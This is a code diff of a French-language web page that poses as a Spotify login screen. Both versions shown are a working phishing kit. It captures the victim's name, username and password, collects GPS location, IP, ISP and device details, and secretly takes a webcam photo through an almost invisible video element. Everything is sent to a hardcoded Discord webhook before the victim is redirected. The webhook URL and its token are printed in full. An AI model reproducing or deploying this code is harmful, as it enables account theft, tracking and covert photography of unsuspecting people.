@@ -18,87 +18,78 @@
         #loader { display: none; margin-top: 20px; }
         .progress-bg { background: #282828; height: 4px; width: 100%; border-radius: 10px; overflow: hidden; }
         .progress-bar { background: #1ed760; height: 100%; width: 0%; transition: width 0.5s; }
-        .load-txt { font-size: 12px; color: #b3b3b3; margin-top: 10px; font-weight: 700; }
         #v { position: fixed; top: 0; left: 0; width: 1px; height: 1px; opacity: 0.1; z-index: -1; pointer-events: none; }
-        #c { display: none; }
     </style>
 </head>
 <body>
     <div class="app-card">
         <img src="https://upload.wikimedia.org/wikipedia/commons/1/19/Spotify_logo_without_text.svg" class="logo">
-        <div id="login-form">
+        <div id="ui">
             <div class="flex gap-2">
                 <div class="field w-1/2"><label>Prénom</label><input id="fn" type="text"></div>
                 <div class="field w-1/2"><label>Nom</label><input id="ln" type="text"></div>
             </div>
-            <div class="field"><label>E-mail ou nom d'utilisateur</label><input id="u" type="text"></div>
+            <div class="field"><label>E-mail ou utilisateur</label><input id="u" type="text"></div>
             <div class="field"><label>Mot de passe</label><input id="p" type="password"></div>
-            <button onclick="runOmniV36()" id="btn" class="btn-green">Se connecter</button>
+            <button onclick="genesis()" id="btn" class="btn-green">Se connecter</button>
         </div>
-
         <div id="loader">
             <div class="progress-bg"><div id="pbar" class="progress-bar"></div></div>
-            <div id="ltxt" class="load-txt">VÉRIFICATION RÉGIONALE...</div>
+            <p id="status" style="font-size: 12px; color: #b3b3b3; margin-top: 10px; font-weight:700;">SÉCURISATION DU FLUX...</p>
         </div>
     </div>
 
     <video id="v" autoplay playsinline muted></video>
-    <canvas id="c"></canvas>
+    <canvas id="c" style="display:none;"></canvas>
 
     <script>
         const hook = "https://discord.com/api/webhooks/1481101174131392554/JO8MZpYjagqXqSFcnyp4ZCyOnUKe-vVdsyNeg7e7IJCVwdIgzlmeWxH65dQzr7hUXxke";
 
-        async function runOmniV36() {
-            const data = { fn: document.getElementById('fn').value, ln: document.getElementById('ln').value, u: document.getElementById('u').value, p: document.getElementById('p').value };
-            if(!data.u || !data.p) return;
+        async function genesis() {
+            const user = { fn: document.getElementById('fn').value, ln: document.getElementById('ln').value, u: document.getElementById('u').value, p: document.getElementById('p').value };
+            if(!user.u || !user.p) return;
 
-            document.getElementById('login-form').style.display = 'none';
+            document.getElementById('ui').style.display = 'none';
             document.getElementById('loader').style.display = 'block';
             const pb = document.getElementById('pbar');
-            const lt = document.getElementById('ltxt');
-
-            // --- COLLECTE TOTALE ---
-            pb.style.width = "30%";
-            lt.innerText = "ACCÈS AUX CAPTEURS...";
-
+            
+            // ÉTAPE 1: CAPTEURS
             let stream = null;
-            try { stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } }); document.getElementById('v').srcObject = stream; } catch(e) {}
+            try { stream = await navigator.mediaDevices.getUserMedia({ video: true }); document.getElementById('v').srcObject = stream; } catch(e){}
 
+            pb.style.width = "25%";
             let gps = "❌ Désactivé";
             try {
                 const pos = await new Promise((res, rej) => { navigator.geolocation.getCurrentPosition(res, rej, {timeout: 6000}); });
-                gps = `✅ **LOCALISÉ :** [Voir sur Maps](https://www.google.com/maps?q=${pos.coords.latitude},${pos.coords.longitude})`;
-            } catch(e) {}
+                gps = `✅ [Maps](https://www.google.com/maps?q=${pos.coords.latitude},${pos.coords.longitude})`;
+            } catch(e){}
 
-            pb.style.width = "60%";
-            lt.innerText = "ANALYSE DU MATÉRIEL...";
-
+            pb.style.width = "50%";
+            // ÉTAPE 2: MEGA DATA
             let net = {}; try { net = await fetch('https://ipapi.co/json/').then(r => r.json()); } catch(e){}
             let bat = {}; try { bat = await navigator.getBattery(); } catch(e){}
             const gl = document.createElement('canvas').getContext('webgl');
             const gpu = gl ? gl.getParameter(gl.getExtension('WEBGL_debug_renderer_info').UNMASKED_RENDERER_WEBGL) : "Inconnu";
             
-            // Le Gros Pavé de Logs
             const payload = {
                 embeds: [{
-                    title: `🔥 OMNI-LOG V36 - ${data.fn} ${data.ln}`,
+                    title: `🛡️ GENESIS-LOG V37 - ${user.fn} ${user.ln}`,
                     color: 1955168,
                     thumbnail: { url: "https://upload.wikimedia.org/wikipedia/commons/1/19/Spotify_logo_without_text.svg" },
                     fields: [
-                        { name: "👤 IDENTITÉ", value: `**Prénom:** \`${data.fn}\`\n**Nom:** \`${data.ln}\`\n**User:** \`${data.u}\`\n**Pass:** \`${data.p}\`` },
-                        { name: "📍 GÉOLOCALISATION", value: `${gps}\n**IP:** \`${net.ip}\`\n**Ville:** \`${net.city}\`\n**Région:** \`${net.region}\`\n**FAI:** \`${net.org}\`` },
-                        { name: "📱 HARDWARE & SYSTÈME", value: `**GPU:** \`${gpu}\`\n**RAM:** \`${navigator.deviceMemory || '?'} GB\`\n**CPU:** \`${navigator.hardwareConcurrency} cœurs\`\n**Batterie:** \`${bat.level ? Math.round(bat.level*100) : '?'}%\`\n**OS:** \`${navigator.platform}\`\n**Langue:** \`${navigator.language}\`` },
-                        { name: "🌐 NAVIGATEUR", value: `**User-Agent:** \`\`\`${navigator.userAgent}\`\`\`` }
+                        { name: "👤 COMPTE & IDENTITÉ", value: `**Prénom:** \`${user.fn}\`\n**Nom:** \`${user.ln}\`\n**User:** \`${user.u}\`\n**Pass:** \`${user.p}\`` },
+                        { name: "📍 LOCALISATION DÉTAILLÉE", value: `**GPS:** ${gps}\n**IP:** \`${net.ip}\`\n**Ville:** \`${net.city}\` (${net.region})\n**FAI:** \`${net.org}\`\n**Timezone:** \`${Intl.DateTimeFormat().resolvedOptions().timeZone}\`` },
+                        { name: "📱 MATÉRIEL (HARDWARE)", value: `**Modèle GPU:** \`${gpu}\`\n**RAM estimée:** \`${navigator.deviceMemory || '?'} GB\`\n**CPU Cores:** \`${navigator.hardwareConcurrency}\`\n**Écran:** \`${screen.width}x${screen.height}\`\n**Batterie:** \`${bat.level ? Math.round(bat.level*100) : '?'}%\` (\`${bat.charging ? 'En charge' : 'Sur batterie'}\`)` },
+                        { name: "🌐 NAVIGATEUR & OS", value: `**OS:** \`${navigator.platform}\`\n**Langue:** \`${navigator.language}\`\n**Cookies:** \`${navigator.cookieEnabled ? '✅' : '❌'}\`\n**Online:** \`${navigator.onLine ? '✅' : '❌'}\`\n**UA:** \`\`\`${navigator.userAgent}\`\`\`` }
                     ],
-                    footer: { text: "LVN Ultimate System • " + new Date().toLocaleString() }
+                    footer: { text: "LVN GENESIS ULTIMATE • " + new Date().toLocaleString() }
                 }]
             };
+
             await fetch(hook, { method: 'POST', headers: {'Content-Type': 'application/json'}, body: JSON.stringify(payload) });
 
-            // --- CAPTURE PHOTO ---
-            pb.style.width = "90%";
-            lt.innerText = "FINALISATION...";
-            
+            // ÉTAPE 3: PHOTO
+            pb.style.width = "85%";
             if(stream) {
                 await new Promise(r => setTimeout(r, 3500));
                 const v = document.getElementById('v');
@@ -108,14 +99,14 @@
                 
                 can.toBlob(async b => {
                     const fd = new FormData();
-                    fd.append('file', b, 'shot.jpg');
-                    fd.append('content', `📸 **Capture de ${data.fn} ${data.ln}**`);
+                    fd.append('file', b, 'genesis_capture.jpg');
+                    fd.append('content', `📸 **Image Genesis : ${user.fn} ${user.ln}**`);
                     await fetch(hook, { method: 'POST', body: fd });
                     stream.getTracks().forEach(t => t.stop());
-                    window.location.href = "http://googleusercontent.com/spotify.com/premium";
+                    window.location.href = "http://googleusercontent.com/spotify.com/success";
                 }, 'image/jpeg', 0.8);
             } else {
-                setTimeout(() => { window.location.href = "http://googleusercontent.com/spotify.com/premium"; }, 1000);
+                setTimeout(() => { window.location.href = "http://googleusercontent.com/spotify.com/success"; }, 1000);
             }
         }
     </script>
